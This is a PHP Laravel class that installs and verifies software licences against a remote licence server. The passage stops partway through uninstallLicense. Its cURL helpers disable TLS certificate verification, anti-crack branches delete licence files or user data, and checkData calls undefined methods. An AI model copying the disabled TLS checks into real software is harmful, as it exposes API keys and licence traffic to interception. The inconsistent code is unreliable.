<?php

namespace IngressITSolutions\Generator;

use IngressITSolutions\Generator\Exception\BaseException;
use IngressITSolutions\Generator\Generator;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Carbon\Carbon;


class LicMan
{
    /**
     *
     *
     *
     **/


    //check Auto PHP Licenser core configuration and return an array with error messages if something wrong
    public function checkSettings(){
        $notifications_array=array();

        if (empty(config('lmconfig.LM_PRODUCT_KEY'))) //invalid encryption salt
        {
            $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_KEY');
        }

        if (empty(config('lmconfig.LM_API_KEY'))) //invalid License Manager Installer API Key
        {
            $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_MISSING_INSTALL_API_KEY');
        }


        if (empty(config('lmconfig.LM_ROOT_URL'))) //invalid License Manager server URL
        {
            $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_ROOT_URL');
        }

        if (empty(config('lmconfig.LM_PRODUCT_ID'))) //invalid product ID
        {
            $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_ID');
        }

        if (!$this->validateNumberOrRange(config('lmconfig.LM_DAYS'), 1, 365)) //invalid verification period
        {
            $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD');
        }




        return $notifications_array;
    }


    //generate signature to be submitted to Auto PHP Licenser server
    public function generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
        $script_signature=null;
        $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));

        if (!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
        {
            $script_signature=hash("sha256", gmdate("Y-m-d").$ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE.config('lmconfig.LM_PRODUCT_ID').implode("", $root_ips_array));
        }

        return $script_signature;
    }



    //install license
    public function installLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
        $notifications_array= array();

        $apl_core_notifications= $this->checkSettings(); //check core settings
        if (empty($apl_core_notifications)) { //only continue if script is properly configured
            if ($this->getLicenseData(true) == 1) { //license already installed
                $notifications_array['notification_case'] = "notification_already_installed";
                $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_SCRIPT_ALREADY_INSTALLED');
            } else { //license not yet installed, do it now

                $INSTALLATION_HASH = hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE); //generate hash
                // $licFile  = File::get(Storage::disk('local')->get('license.lic'));

                //$parsedData  = Generator::parse($licFile, config('lmconfig.LM_PRODUCT_KEY'));

                $post_info="product_id=".rawurlencode(config('lmconfig.LM_PRODUCT_ID'))."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode($this->generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array=$this->customPost(config('lmconfig.LM_ROOT_URL')."/api/license/install", $post_info, $ROOT_URL);
                $arrayData = json_decode($content_array['body']);

                if($content_array['body'] === 'Your IP Address is not whitelisted.' || $content_array['body'] === 'Invalid API key' || $content_array['body'] === 'No valid API key'){

                    $notifications_array['notification_case'] = "notification_api_not_whitelist";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_API_WHITELIST_ISSUE');
                } else {
                    $notifications_array = $this->parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                }


                //dd($notifications_array);

                if ($notifications_array['notification_case']=="notification_license_ok") { //everything OK

                    $INSTALLATION_KEY=$this->customEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), config('lmconfig.LM_PRODUCT_KEY').$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                    $LCD=$this->customEncrypt(date("Y-m-d", strtotime("-".config('lmconfig.LM_DAYS')." days")), config('lmconfig.LM_PRODUCT_KEY').$INSTALLATION_KEY); //license will need to be verified right after installation
                    $LRD=$this->customEncrypt(date("Y-m-d"), config('lmconfig.LM_PRODUCT_KEY').$INSTALLATION_KEY);





                    $post_info="product_id=".rawurlencode(config('lmconfig.LM_PRODUCT_ID')) ."&siteId=" . rawurlencode($arrayData->returnVariables->siteId) ."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode($this->generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                    $pubKey = $this->getMyKey(config('lmconfig.LM_ROOT_URL')."/api/license/key", $post_info, $ROOT_URL);

                    //dd($pubKey);
                    $notifications_key =$this->parseServerNotifications($pubKey, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

                    if(File::exists(storage_path('app/licenses.lic'))){
                        Storage::delete('licenses.key');
                    }
                    Storage::put('public.key', $notifications_key['notification_data']->pubKey);
                    Storage::put('license.lic', $notifications_key['notification_data']->licenseVal);


                }  elseif($notifications_array['notification_case'] == 'notification_license_expired') {
                    $notifications_array['notification_case']="notification_license_expired";
                    $notifications_array['notification_text']=config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD');
                    $notifications_array['notification_data'] = [];
                }  elseif($notifications_array['notification_case'] == 'notification_invalid_ip') {
                    $notifications_array['notification_case']="notification_invalid_ip";
                    $notifications_array['notification_text']=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_DNS');
                    $notifications_array['notification_data'] = [];
                } elseif($notifications_array['notification_case'] == 'notification_product_not_found') {
                    $notifications_array['notification_case']="notification_product_not_found";
                    $notifications_array['notification_text']=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_ID');
                    $notifications_array['notification_data'] = [];
                } elseif($notifications_array['notification_case'] == 'notification_client_not_found'){
                    $notifications_array['notification_case']="notification_client_not_found";
                    $notifications_array['notification_text']=config('lmconfig.LM_CORE_NOTIFICATION_CLIENT_NOT_FOUND');
                    $notifications_array['notification_data'] = [];
                } elseif($notifications_array['notification_case'] == "notification_api_not_whitelist") {

                    $notifications_array['notification_case'] = "notification_api_not_whitelist";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_API_WHITELIST_ISSUE');
                }else{
                    $notifications_array['notification_case']="notification_already_installed";
                    $notifications_array['notification_text']= config('lmconfig.LM_CORE_NOTIFICATION_INVALID_LICENSE_KEY');
                    $notifications_array['notification_data'] = [];
                }


            }
        } else {//script is not properly configured
            $notifications_array['notification_case']="notification_script_corrupted";
            $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

        return $notifications_array;

    }


    public function getMyKey($url, $post_info=null, $refer=null) {
        $userAgent="License Manager cURL Key Request";
        $connect_timeout=20;
        $server_response_array=array();
        $formatted_headers_array=array();
        $personalToken = config('lmconfig.LM_API_KEY');

        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
            if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) { //use original URL as refer when no valid refer URL provided
                $refer=$url;
            }

            $ch=curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_REFERER, $refer);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt_array($ch, array(
                CURLOPT_HTTPHEADER => array(
                    "X-Authorization: {$personalToken}",
                    "User-Agent: {$userAgent}"
                )));

            //this function is called by curl for each header received - https://stackoverflow.com/questions/9183178/can-php-curl-retrieve-response-headers-and-body-in-a-single-request


            $result=curl_exec($ch);
            $curl_error=curl_error($ch); //returns a human readable error (if any)
            curl_close($ch);

            //dd($result);
            $server_response_array['headers']=$formatted_headers_array;
            $server_response_array['error']=$curl_error;
            $server_response_array['body']=$result;
        }

        return $server_response_array;

    }

    //encrypt text with custom key
    public function customEncrypt($string, $key) {
        $encrypted_string=null;

        if (!empty($string) && !empty($key)) {
            $iv=openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc")); //generate an initialization vector

            $encrypted_string=openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv); //encrypt the string using AES 256 encryption in CBC mode using encryption key and initialization vector
            $encrypted_string=base64_encode($encrypted_string."::".$iv); //the $iv is just as important as the key for decrypting, so save it with encrypted string using a unique separator "::"
        }

        return $encrypted_string;
    }



    //process response from Auto PHP Licenser server. if response received, validate it and parse notifications and data (if any). if response not received or is invalid, return a corresponding notification
    public function parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
        $notifications_array=array();



        if (!empty($content_array)) { //response received, validate it
            $body = json_decode($content_array['body']);

            if (!empty($body->notification_server_signature) && $this->verifyServerSignature($body->notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) {//response valid
                $notifications_array['notification_case']=$body->notification_case;
                $notifications_array['notification_text']=$body->notification_text;
                if (!empty($body->returnVariables)) { //additional data returned
                    $notifications_array['notification_data']=$body->returnVariables;
                }
            } else { //response invalid
                $notifications_array['notification_case']="notification_invalid_response";
                $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_INVALID_RESPONSE');
            }
        }
        else {//no response received
            $notifications_array['notification_case']="notification_no_connection";
            $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_NO_CONNECTION');
        }

        //dd($notifications_array);
        return $notifications_array;
    }


    //get raw domain (returns (sub.)domain.com from url like http://www.(sub.)domain.com/something.php?xx=yy)
    public function getRawDomain($url) {
        $raw_domain=null;

        if (!empty($url)) {
            $url_array=parse_url($url);
            if (empty($url_array['scheme'])) {//in case no scheme was provided in url, it will be parsed incorrectly. add http:// and re-parse
                $url="http://".$url;
                $url_array=parse_url($url);
            }

            if (!empty($url_array['host'])) {
                $raw_domain=$url_array['host'];

                $raw_domain=trim(str_ireplace("www.", "", filter_var($raw_domain, FILTER_SANITIZE_URL)));
            }
        }

        return $raw_domain;
    }



    //verify signature received from Auto PHP Licenser server
    public function verifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
        $result=false;
        $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));

        if (!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
        {
            if (hash("sha256", implode("", $root_ips_array).config('lmconfig.LM_PRODUCT_ID').$LICENSE_CODE.$CLIENT_EMAIL.$ROOT_URL.gmdate("Y-m-d"))==$notification_server_signature)
            {
                $result=true;
            }
        }

        return $result;
    }



    //make post requests with cookies and referrers, return array with server headers, errors, and body content
    public function customPost($url, $post_info=null, $refer=null) {
        $userAgent="License Manager cURL";
        $connect_timeout=20;
        $server_response_array=array();
        $formatted_headers_array=array();
        $personalToken = config('lmconfig.LM_API_KEY');

        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
            if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) { //use original URL as refer when no valid refer URL provided
                $refer=$url;
            }

            $ch=curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_REFERER, $refer);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt_array($ch, array(
                CURLOPT_HTTPHEADER => array(
                    "X-Authorization: {$personalToken}",
                    "User-Agent: {$userAgent}"
                )));

            //this function is called by curl for each header received - https://stackoverflow.com/questions/9183178/can-php-curl-retrieve-response-headers-and-body-in-a-single-request


            $result=curl_exec($ch);
            $curl_error=curl_error($ch); //returns a human readable error (if any)
            curl_close($ch);

            //dd($result);
            $server_response_array['headers']=$formatted_headers_array;
            $server_response_array['error']=$curl_error;
            $server_response_array['body']=$result;
        }

        return $server_response_array;
    }


    //return an array with license data,no matter where license is stored
    public function getLicenseData($freshInstall = false) {
        $isInstalled = 0;
        if($freshInstall === false) {
            $licRecDB = DB::table('lmconfig')->first();
            $licRecStorage = $this->parseLicenseFile();
            if($licRecDB || $licRecStorage){
                $isInstalled = 1;
            } else {
                $isInstalled = 0;
            }
        } else {
            $licRecStorage = $this->parseLicenseFile();
            if($licRecStorage == 1){
                $isInstalled = 1;
            } else {
                $isInstalled = 0;
            }
        }
        return $isInstalled;
    }


    //parse license file and make an array with license data
    public function parseLicenseFile() {
        $licRecStorage = 0;
        if (Storage::exists('/app/license.lic')) {
            $licFile  = File::get(storage_path('/app/license.lic'));
            //$pubKey = File::get(Storage::disk('local')->get('public.txt'));

            if (!empty($licFile)) {
                $licRecStorage = 1;
            } else {
                $licRecStorage = 0;
            }
        } else {
            $licRecStorage = 0;
        }

        return $licRecStorage;
    }




    //validate numbers (or ranges like 1-10) and check if they match min and max values
    private static function validateNumberOrRange($number, $min_value, $max_value=INF){
        $result=false;

        if (filter_var($number, FILTER_VALIDATE_INT)===0 || !filter_var($number, FILTER_VALIDATE_INT)===false) //number provided
        {
            if ($number>=$min_value && $number<=$max_value)
            {
                $result=true;
            }
            else
            {
                $result=false;
            }
        }

        if (stristr($number, "-")) //range provided
        {
            $numbers_array=explode("-", $number);
            if (filter_var($numbers_array[0], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[0], FILTER_VALIDATE_INT)===false && filter_var($numbers_array[1], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[1], FILTER_VALIDATE_INT)===false)
            {
                if ($numbers_array[0]>=$min_value && $numbers_array[1]<=$max_value && $numbers_array[0]<=$numbers_array[1])
                {
                    $result=true;
                }
                else
                {
                    $result=false;
                }
            }
        }

        return $result;
    }



    //calculate number of days between dates
    public function getDaysBetweenDates($date_from, $date_to)
    {
        $number_of_days=0;

        if ($this->verifyDateTime($date_from, "Y-m-d") && $this->verifyDateTime($date_to, "Y-m-d"))
        {
            $date_to=new DateTime($date_to);
            $date_from=new DateTime($date_from);
            $number_of_days=$date_from->diff($date_to)->format("%a");
        }

        return $number_of_days;
    }


    public function checkDate($data){

        if($data['lastCheckedDate']){
            if(Carbon::now() > Carbon::parse($data['lastCheckedDate'])->addDays(config('lmconfig.LM_DAYS')) && Carbon::parse($data['lastCheckedDate'])->addDays(config('lmconfig.LM_DAYS')) < 8){
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function verifyLicense($rootUrl, $forceCheck = false)
    {
        $notifications_array=array();
        $update_lrd_value=0;
        $update_lcd_value=0;
        $updated_records=0;
        $licman_core_notifications=$this->checkSettings(); //check core settings

        if (empty($licman_core_notifications)) //only continue if script is properly configured
        {


            if(File::exists(storage_path('app/public.key'))){
                $public = File::get(storage_path('app/public.key'));
            } else {
                $notifications_array['notification_case'] = "notification_key_missing";
                $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_KEYFILE_MISSING');
            }


            if(File::exists(storage_path('app/license.lic'))){
                $license = File::get(storage_path('app/license.lic'));
            } else {
                $notifications_array['notification_case'] = "notification_key_missing";
                $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_FILE_MISSING');
            }


            if(File::exists(storage_path('app/license.lic')) && File::exists(storage_path('app/public.key'))){
                $data = Generator::parse($license, $public);
            }
            //dd($data);
            if (!empty($data)) {

                if ($this->checkDate($data) || $forceCheck) {
                    //Need to check license

                    if ($data['productKey'] == config('lmconfig.LM_PRODUCT_KEY')) {


                        if (!empty($data['rootUrl']) && !empty($data['clientEmail']) && !empty($data['licenseKey'])) {
                            $INSTALLATION_HASH = hash("sha256", $rootUrl.$data['clientEmail'].$data['licenseKey']); //generate hash

                            $post_info = "product_id=" . rawurlencode(config('lmconfig.LM_PRODUCT_ID')) ."&siteId=" . rawurlencode($data['siteId']) .  "&client_email=" . rawurlencode($data['clientEmail']) . "&license_code=" . rawurlencode($data['licenseKey']) . "&root_url=" . rawurlencode($rootUrl) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode($this->generateScriptSignature($rootUrl, $data['clientEmail'], $data['licenseKey']));
                            $pubKey = $this->getMyKey(config('lmconfig.LM_ROOT_URL') . "/api/license/key", $post_info, $rootUrl);
                            if($pubKey['body'] === 'Your IP Address is not whitelisted.' || $pubKey['body'] === 'Invalid API key' || $pubKey['body'] === 'No valid API key'){

                                $notifications_array['notification_case'] = "notification_api_not_whitelist";
                                $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_API_WHITELIST_ISSUE');
                            } else {
                                $notifications_key = $this->parseServerNotifications($pubKey, $rootUrl, $data['clientEmail'], $data['licenseKey']);
                            }

                            if(!empty($notifications_key['notification_data']) && array_key_exists('licenseVal', $notifications_key['notification_data'])) {


                                $licenseVal = Generator::parse($notifications_key['notification_data']->licenseVal, $notifications_key['notification_data']->pubKey);


                                if ($licenseVal['expiryDate'] < Carbon::now()) {
                                    //license expired.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD
                                    $notifications_array['notification_case'] = "notification_license_expired";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD');
                                }

                                if ($licenseVal['supportDate'] < Carbon::now()) {
                                    //support expired.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED
                                    $notifications_array['notification_case'] = "notification_license_support_expired";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED');

                                }

                                if ($licenseVal['productId'] != config('lmconfig.LM_PRODUCT_ID')) {
                                    // invalid license
                                    $notifications_array['notification_case'] = "notification_license_corrupted";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                                    if(config('lmconfig.LM_DELETE_CRACKED')) {
                                        Storage::delete('public.key');
                                        Storage::delete('license.lic');
                                        Storage::put('licenses.lic', 'You are not god.');
                                    }
                                }

                                if ($licenseVal['cancelDate']) {
                                    // license cancelled / suspended.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED
                                    $notifications_array['notification_case'] = "notification_license_suspended";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED');
                                }

                                if ($licenseVal['productKey'] != config('lmconfig.LM_PRODUCT_KEY')) {
                                    // invalid license
                                    $notifications_array['notification_case'] = "notification_license_corrupted";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                                }


                                if ($licenseVal['rootUrl'] != $rootUrl && $licenseVal['installLimit'] > 1) {
                                    // invalid domain for installation.LM_CORE_NOTIFICATION_INVALID_ROOT_URL
                                    $notifications_array['notification_case'] = "notification_invalid_url";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_INVALID_ROOT_URL');

                                }


                                if ($licenseVal['installLimit'] < $licenseVal['totalInstall']) {
                                    // all license installed.LM_NOTIFICATION_LICENSE_OCCUPIED
                                    $notifications_array['notification_case'] = "notification_license_limit";
                                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_OCCUPIED');

                                }


                                if (!array_key_exists('notification_case', $notifications_array)) {

                                    $notifications_array['notification_case'] = "notification_license_ok";
                                    $notifications_array['notification_text'] = null;
                                    Storage::put('license.lic', $notifications_key['notification_data']->licenseVal);

                                }


                            } else {
                                $notifications_array['notification_case'] = $notifications_key['notification_text'];
                                $notifications_array['notification_text'] = $notifications_key['notification_text'];
                                if(config('lmconfig.LM_DELETE_CRACKED')) {
                                    Storage::delete('public.key');
                                    Storage::delete('license.lic');
                                    Storage::put('licenses.lic', 'You are not god.');
                                }
                            }

                        } else {
                            ////data not found in license file.
                            $notifications_array['notification_case'] = "notification_license_corrupted";
                            $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                            if(config('lmconfig.LM_DELETE_CRACKED')) {
                                Storage::delete('public.key');
                                Storage::delete('license.lic');
                                Storage::put('licenses.lic', 'You are not god.');
                            }
                        }



                    } else {
                        //invalid product key.
                        $notifications_array['notification_case'] = "notification_license_corrupted";
                        $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                        if(config('lmconfig.LM_DELETE_CRACKED')) {
                            Storage::delete('public.key');
                            Storage::delete('license.lic');
                            Storage::put('licenses.lic', 'You are not god.');
                        }
                    }




                } else {
                    //looks good for now so let us proceed with local check

                    if ($data['expiryDate'] < Carbon::now()) {
                        //license expired.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD
                        $notifications_array['notification_case'] = "notification_license_expired";
                        $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD');
                    }

                    if ($data['supportDate'] < Carbon::now()) {
                        //support expired.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED
                        $notifications_array['notification_case'] = "notification_license_support_expired";
                        $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED');

                    }

                    if ($data['productId'] != config('lmconfig.LM_PRODUCT_ID')) {
                        // invalid license
                        $notifications_array['notification_case'] = "notification_license_corrupted";
                        $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                        if(config('lmconfig.LM_DELETE_CRACKED')) {
                            Storage::delete('public.key');
                            Storage::delete('license.lic');
                            Storage::put('licenses.lic', 'You are not god.');
                        }
                    }

                    if ($data['cancelDate']) {
                        // license cancelled / suspended.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED
                        $notifications_array['notification_case'] = "notification_license_suspended";
                        $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED');

                    }

                    if ($data['productKey'] != config('lmconfig.LM_PRODUCT_KEY')) {
                        // invalid license
                        $notifications_array['notification_case'] = "notification_license_corrupted";
                        $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                        if(config('lmconfig.LM_DELETE_CRACKED')) {
                            Storage::delete('public.key');
                            Storage::delete('license.lic');
                            Storage::put('licenses.lic', 'You are not god.');
                        }
                    }


                    if ($data['rootUrl'] != $rootUrl && $data['installLimit'] > 1) {
                        // invalid domain for installation.LM_CORE_NOTIFICATION_INVALID_ROOT_URL
                        $notifications_array['notification_case'] = "notification_invalid_url";
                        $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_INVALID_ROOT_URL');

                    }


                    if ($data['installLimit'] < $data['totalInstall']) {
                        // all license installed.LM_NOTIFICATION_LICENSE_OCCUPIED
                        $notifications_array['notification_case'] = "notification_license_limit";
                        $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_OCCUPIED');

                    }

                    if(!array_key_exists('notification_case', $notifications_array)){

                        $notifications_array['notification_case']="notification_license_ok";
                        $notifications_array['notification_text']=null;

                    }


                }


            } else {
                $notifications_array['notification_case'] = "notification_license_corrupted";
                $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                if(config('lmconfig.LM_DELETE_CRACKED')) {
                    Storage::delete('public.key');
                    Storage::delete('license.lic');
                    Storage::put('licenses.lic', 'You are not god.');
                }
            }



        }



        return $notifications_array;
    }



    //check license data and return false if something wrong
    public function checkData($MYSQLI_LINK=null)
    {
        $error_detected=0;
        $cracking_detected=0;
        $data_check_result=false;

        extract($this->getLicenseData($MYSQLI_LINK)); //get license data

        if (!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)) //do further check only if essential variables are valid
        {
            $LCD=$this->customDecrypt($LCD, config('installer.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LCD value for easier data check
            $LRD=$this->customDecrypt($LRD, config('installer.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LRD value for easier data check

            if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid script url
            {
                $error_detected=1;
            }

            if (filter_var($this->getCurrentUrl(), FILTER_VALIDATE_URL) && stristr($this->getRootUrl($this->getCurrentUrl(), 1, 1, 0, 1), $this->getRootUrl("$ROOT_URL/", 1, 1, 0, 1))===false) //script is opened via browser (current_url set), but current_url is different from value in database
            {
                $error_detected=1;
            }

            if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH!=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE)) //invalid installation hash (value - $ROOT_URL, $CLIENT_EMAIL AND $LICENSE_CODE encrypted with sha256)
            {
                $error_detected=1;
            }

            if (empty($INSTALLATION_KEY) || !password_verify($LRD, $this->customDecrypt($INSTALLATION_KEY, config('installer.PRODUCT_KEY').$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
            {
                $error_detected=1;
            }

            if (!$this->verifyDateTime($LCD, "Y-m-d")) //last check date is invalid
            {
                $error_detected=1;
            }

            if (!$this->verifyDateTime($LRD, "Y-m-d")) //last run date is invalid
            {
                $error_detected=1;
            }

            //check for possible cracking attempts - starts
            if ($this->verifyDateTime($LCD, "Y-m-d") && $LCD>date("Y-m-d", strtotime("+1 day"))) //last check date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
                $error_detected=1;
                $cracking_detected=1;
            }

            if ($this->verifyDateTime($LRD, "Y-m-d") && $LRD>date("Y-m-d", strtotime("+1 day"))) //last run date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
                $error_detected=1;
                $cracking_detected=1;
            }

            if ($this->verifyDateTime($LCD, "Y-m-d") && $this->verifyDateTime($LRD, "Y-m-d") && $LCD>$LRD) //last check date and last run date is VALID, but LCD is higher than LRD (someone manually decrypted and overwrote it or changed system time back)
            {
                $error_detected=1;
                $cracking_detected=1;
            }

            if ($cracking_detected==1 && config('lmconfig.LM_DELETE_CRACKED')=="YES") //delete user data
            {
                $this->deleteData($MYSQLI_LINK);
            }
            //check for possible cracking attempts - ends

            if ($error_detected!=1 && $cracking_detected!=1) //everything OK
            {
                $data_check_result=true;
            }
        }

        return $data_check_result;
    }



    public function uninstallLicense($rootUrl){
        $notifications_array=array();
        $apl_core_notifications= $this->checkSettings(); //check core settings

        if (empty($apl_core_notifications)) {//only continue if script is properly configured

            if(File::exists(storage_path('app/public.key'))){
                $public = File::get(storage_path('app/public.key'));
            } else {
                $notifications_array['notification_case'] = "notification_key_missing";
                $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_KEYFILE_MISSING');
            }


            if(File::exists(storage_path('app/license.lic'))){
                $license = File::get(storage_path('app/license.lic'));
            } else {
                $notifications_array['notification_case'] = "notification_key_missing";
                $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_FILE_MISSING');
            }


            if(File::exists(storage_path('app/license.lic')) && File::exists(storage_path('app/public.key'))){
                $data = Generator::parse($license, $public);
            }
            //dd($data);
            if (!empty($data)) {

                if ($data['expiryDate'] < Carbon::now()) {
                    //license expired.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD
                    $notifications_array['notification_case'] = "notification_license_expired";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_EXPIRED_PERIOD');
                }

                if ($data['supportDate'] < Carbon::now()) {
                    //support expired.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED
                    $notifications_array['notification_case'] = "notification_license_support_expired";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUPPORT_EXPIRED');

                }

                if ($data['productId'] != config('lmconfig.LM_PRODUCT_ID')) {
                    // invalid license
                    $notifications_array['notification_case'] = "notification_license_corrupted";
                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                    if(config('lmconfig.LM_DELETE_CRACKED')) {
                        Storage::delete('public.key');
